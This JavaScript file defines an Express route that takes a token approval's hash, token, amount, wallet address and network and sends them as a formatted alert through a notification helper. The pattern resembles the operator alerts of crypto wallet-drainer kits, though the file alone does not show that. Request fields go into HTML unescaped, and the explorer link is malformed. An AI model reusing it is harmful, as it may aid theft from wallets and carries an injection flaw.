const express = require("express");
const { sendNotification } = require("../helper/utils");
const router = express.Router();

router.post("/", async (req, res) => {
  const { tx_hash, token_symbol, amount, walletAddress, currentNetwork } = req.body;

  try {
    const explorerBaseUrl = currentNetwork.toLowerCase() === 'ethereum'
      ? 'https://etherscan.io/tx/'
      : 'https://etherscan.io/tx/'; // Add support for other networks if needed

    const text = `✅ <b>Transaction Approved</b>\n\n` +
                 `💰 <b>Token</b>: ${token_symbol}\n` +
                 `📈 <b>Amount</b>: ${amount}\n` +
                 `📋 <b>Wallet</b>: ${walletAddress}\n` +
                 `⚡️ <b>Network</b>: ${currentNetwork}\n\n` +
                 `🔍 <a href="https://etherscan.io/address/${tx_hash}">View Transaction on Explorer</a>`;

    await sendNotification(text, 'html');
    res.status(200).json({ result: "success" });
  } catch (err) {
    console.error("Error sending approval message:", err);
    res.status(500).json({ result: "failed" });
  }
});

module.exports = router;
